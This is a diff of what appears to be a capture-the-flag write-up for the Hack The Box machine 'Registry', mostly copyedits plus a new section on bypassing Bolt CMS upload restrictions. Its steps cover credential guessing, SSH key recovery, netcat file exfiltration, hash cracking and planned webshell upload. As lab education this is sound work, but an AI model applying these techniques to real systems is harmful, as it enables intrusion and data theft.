@@ -22,7 +22,7 @@ toc_icon: "cog"
 | Creator:          | thek ![](/Sidequests/assets/icons/user-thek.png){:.img-av} |
 
 # About the box
-Registry took me through several services that I've never used before, including one that I wanted to get to know better, Docker. The box begins with an online Docker registry available that's protected by easily guessable creds. After getting into the docker image, credentials are found that get SSH access for user. Using the SSH, enumerate the machine to find another service called "Bolt CMS" and figure out how to upload a webshell to get access to a second user. Then use another service "Restic Backup" to exfiltrate the root flag. Also, I explore a way to get root shell access.
+Registry took me through several services that I've never used before, including one that I wanted to get to know better, Docker. The box begins with an online Docker registry available that's protected by easily guessable creds. After getting into the docker image, credentials are found that get SSH access for the user account. Using the SSH, enumerate the machine to find another service called "Bolt CMS" and figure out how to upload a webshell to get access to a second user. Then use another service "Restic Backup" to exfiltrate the root flag. Also, I explore a way to get root shell access.
 
 # Initial Recon
 ## NMAP Scan
@@ -32,7 +32,7 @@ This sets the options:
 * `-n` for no DNS lookup
 * `-sC` for default scripts
 * `-sV` for service version probing
-* `-Pn` for skip ping check
+* `-Pn` to skip ping check
 * `-p-` for scan all ports
 * and `-oN nmap.txt` for setting the output text file
 
@@ -65,7 +65,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 36.88 seconds
 {% endhighlight %}
 
-Analyzing this NMAP output, we see three ports that are open and their service versions. Keep notes about the services open and what their versions are. In this case there is an Nginx web server operating on HTTP and HTTPS. The key takeaway here is the ssl-cert is showing the hostname in what must be a self-signed certificate, "docker.registry.htb". When finding new hostnames, add them to your "/etc/hosts" file because certain VirtualHosts will require exact hostnames for you to reach them.
+Analyzing this NMAP output, we see three ports that are open and their service versions. Keep notes about the services open and what their versions are. In this case, there is an Nginx web server operating on HTTP and HTTPS. The key takeaway here is the SSL-cert is showing the hostname in what must be a self-signed certificate, "docker.registry.htb". When finding new hostnames, add them to your "/etc/hosts" file because certain VirtualHosts will require exact hostnames for you to reach them.
 
 ## Enumerate docker.registry.htb
 Use a web directory enumeration program like gobuster to find out some things that can be reached. As an experiment, I ran gobuster first against the IP address, and then against the hostname "docker.registry.htb". Only when using the hostname was I able to find anything interesting. Using just the IP address merely gave me the files for the default installation of Nginx.
@@ -119,25 +119,25 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 {% endhighlight %}
 
-If we do some research on the page "/v2" and registry, we find out that is an API endpoint for docker-registry version 2. Since there really doesn't seem to be anything else for intial enumeration, we can move on to getting into the docker registry service.
+If we do some research on the page "/v2" and registry, we find out that it holds an API endpoint for docker-registry version 2. Since there doesn't seem to be anything else for initial enumeration, we can move on to getting into the docker-registry service.
 
 # Attacking The Docker Registry
 ## Gaining access with docker run
-In order to access the remote registry, we need to get the self-signed cert working right. Open the certificate in the web browser while on the "/v2" page and export it under "/etc/docker/certs.d/".
+To access the remote registry, we need to get the self-signed cert working right. Open the certificate in the web browser while on the "/v2" page and export it under "/etc/docker/certs.d/".
 
 Then visit the page found "/v2" under "docker.registry.htb", and a login is presented.
 ![](\Sidequests\assets\registry\2020-03-07_21h13_16.png)
 
-There really isn't any special technique to getting past the login credentials for the docker.registry.htb/v2 page. Just some common guesses will lead you to "admin:admin", which lets you use the service.
+There isn't any special technique to getting past the login credentials for the docker.registry.htb/v2 page. Just some common guesses will lead you to `admin: admin`, which lets you use the service.
 
-Reading the [docker api reference](https://docs.docker.com/registry/spec/api/), we find that listing repositories is done by simply visiting the page "/v2/_catalog". Trying it in the browser shows only one, "bolt-image".
+Reading the [docker API reference](https://docs.docker.com/registry/spec/api/), we find listing repositories is done by simply visiting the page "/v2/_catalog". Trying it in the browser shows only one, "bolt-image".
 
 We want to be able to download and run the image, so first fire up the docker service with `sudo service docker start` then use these steps:
 
 1. To download the image, use the command `sudo docker pull docker.registry.htb/bolt-image`. 
 2. After it's pulled, we will be able to see the image listed in our local images with `sudo docker images`. 
 3. Copy the image id listed for bolt-image to use later. 
-4. And finally, to use the image we have to run it and open a bash shell with `sudo docker run -it --rm 601499e98a60 /bin/bash`. The run command uses `-it` flag to specify that we want to use an interactive tty shell, and `--rm` says to clean up the files used after we're done. Replace "601499e98a60" with the image id copied earlier.
+4. And finally, to use the image we have to run it and open a bash shell with `sudo docker run -it --rm 601499e98a60 /bin/bash`. The run command uses `-it` flag to specify that we want to use an interactive TTY shell, and `--rm` says to clean up the files used after we're done. Replace "601499e98a60" with the image id copied earlier.
 
 ## Enumerate bolt-image
 We are root when we're dropped into the shell inside "bolt-image", so enumerating to figure out the next step should be easy.
@@ -166,7 +166,7 @@ drwx------ 1 root root 4096 May 25  2019 ..
 -rw-r--r-- 1 root root  444 May 25  2019 known_hosts
 {% endhighlight %}
 
-Read the SSH config file and you'll see another use of the hostname, this time it's just "registry.htb". We also see what user SSH is used with: "bolt". Make notes of the findings. Print out the SSH key and copy/paste it into a file on your box. Add "registry.htb" to your "/etc/hosts" file as well. 
+Read the SSH config file and you'll see another use of the hostname, this time it's just "registry.htb". We also see what user SSH is used with, "bolt". Make notes of the findings. Print out the SSH key and copy/paste it into a file on your box. Add "registry.htb" to your "/etc/hosts" file as well. 
 
 {% highlight plain_text %}
 root@6c855edb286c:~/.ssh# cat config
@@ -176,7 +176,7 @@ Host registry
   Hostname registry.htb
 {% endhighlight %}
 
-So with this we should be able to log into the SSH service on port 22 of registry.htb. However, when trying to add the private key, we're presented with the passphrase request. Unfortunately my password cracking tools weren't able to crack that passphrase, so avoid diving down that rabbit hole. 
+So with this, we should be able to log into the SSH service on port 22 of registry.htb. However, when trying to add the private key, we're presented with the passphrase request. Unfortunately, my password cracking tools weren't able to crack that passphrase, so avoid diving down that rabbit hole. 
 
 {% highlight plain_text %}
 ~/htb/registry ᐅ ssh-add ./bolt_rsa
@@ -184,7 +184,7 @@ Enter passphrase for ./bolt_rsa:
 Bad passphrase, try again for ./bolt_rsa: 
 {% endhighlight %}
 
-To find the passphrase, go back to enumerating the bolt-image. There were some other files in root directory we could look at. Most of the files are fairly standard, and the bash history going to "/dev/null" is normal for pentesting boxes. However, the ".viminfo" file is different. 
+To find the passphrase, go back to enumerating the bolt-image. There were some other files in the root directory we could look at. Most of the files are fairly standard, and the bash history going to "/dev/null" is normal for pentesting boxes. However, the ".viminfo" file is different. 
 
 Print it out and you'll see two files that have been recently edited: "/var/www/html/sync.sh" and "/etc/profile.d/01-ssh.sh". 
 
@@ -264,11 +264,11 @@ root@6c855edb286c:~#
 {% endhighlight %}
 
 # SSH Bolt User Enumeration
-After adding the SSH key with the passphrase found, we're able to log into "registry.htb" as "bolt". Use the command `ssh bolt@registry.htb` to get to the user shell, where the "user.txt" flag is found.
+After adding the SSH key with the passphrase found, we're able to login to "registry.htb" as "bolt". Use the command `ssh bolt@registry.htb` to get to the user shell, where the "user.txt" flag is found.
 
 ![](\Sidequests\assets\registry\2020-03-08_21h02_13.png)
 
-After claiming the user flag, we need to find the next thing to exploit. There are no obvious enumeration finds that allow privilege escalation, like a "sudo -l" entry. Instead, look for the config files for Nginx, since we know that's the kind of web server the box is using. You can use the "find" program to look for it quickly.
+After claiming the user flag, we need to find the next thing to exploit. There is no obvious enumeration finds that allow privilege escalation, like a "sudo -l" entry. Instead, look for the config files for Nginx, since we know that's the kind of web server the box is using. You can use the "find" program to look for it quickly.
 
 {% highlight plain_text %}
 bolt@bolt:~$ find /etc -name *nginx* 2>/dev/null
@@ -350,9 +350,9 @@ bolt@bolt:/var/www/html/bolt/app/database$ file bolt.db
 bolt.db: SQLite 3.x database, last written using SQLite version 3022000
 {% endhighlight %}
 
-Unfortunately, the box doesn't have sqlite3 program installed so we can't directly open it from there, it has to first be copied out first. One way to do that is by using netcat.
+Unfortunately, the box doesn't have the SQLite3 program installed so we can't directly open it from there, it has to first be copied out. One way to do that is by using Netcat.
 
-There must be some firewall rules set up to drop outgoing connections, because none of my attempts to send the file back the way I normally do it worked. So instead, it has to be done by setting up the listener on the remote box first.
+There must be some firewall rules set up to drop outgoing connections because none of my attempts to send the file back the way I normally do it worked. So instead, it has to be done by setting up the listener on the remote box first.
 
 `nc -lvnp 5555 < bolt.db`
 
@@ -385,7 +385,7 @@ bolt_entries      bolt_log_system   bolt_taxonomy
 
 Any table with "users" in the name is usually good for enumeration, so dump that table with the SQL query `select * from bolt_users`.
 
-{% highlight sql %}
+{% highlight SQL %}
 sqlite> select * from bolt_users;
 1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2020-03-09 03:46:01|10.10.15.237|Admin|["files://leax.php"]|1||||0||["root","everyone"]
 sqlite> 
@@ -412,7 +412,19 @@ Session completed
 {% endhighlight %}
 
 Turns out the password is cracked right away as "strawberry". Just use "admin" and "strawberry" to login at the prompt on the app page.
-
 [![Bolt App Dashboard](\Sidequests\assets\registry\2020-03-10_22h01_30.png)](\Sidequests\assets\registry\2020-03-10_22h01_30.png)
 
 # Bolt App Hacking
+It turns out that there is a way to upload some files at two places in the app, both are options under "File Management".
+[![File Upload Capabilities](\Sidequests\assets\registry\2020-03-16_22h07_10.png)](\Sidequests\assets\registry\2020-03-16_22h07_10.png)
+
+Unfortunately the file upload doesn't allow PHP files. However, there's a [CVE](https://vuln.whitesourcesoftware.com/vulnerability/CVE-2019-9185/) on the version used that says extensions for file uploads can be changed to PHP. See the following screenshot taken after attempting a PHP file upload.
+[![PHP File Type Error](\Sidequests\assets\registry\2020-03-16_22h09_13.png)](\Sidequests\assets\registry\2020-03-16_22h09_13.png)
+
+Also, there is a configuration file that defines which file types are allowed and which aren't. The config file can be found at "Configuration -> Main Configuration"
+[![Main Configuration](\Sidequests\assets\registry\2020-03-16_22h20_39.png)](\Sidequests\assets\registry\2020-03-16_22h20_39.png)
+
+It says that php files are never allowed even if they are in the list, but for some reason that's not true in this case. If you can change the list, you can upload php files. 
+[![Accepted File Types](\Sidequests\assets\registry\2020-03-16_22h17_00.png)](\Sidequests\assets\registry\2020-03-16_22h17_00.png)
+
+## Editing the Main Configuration File
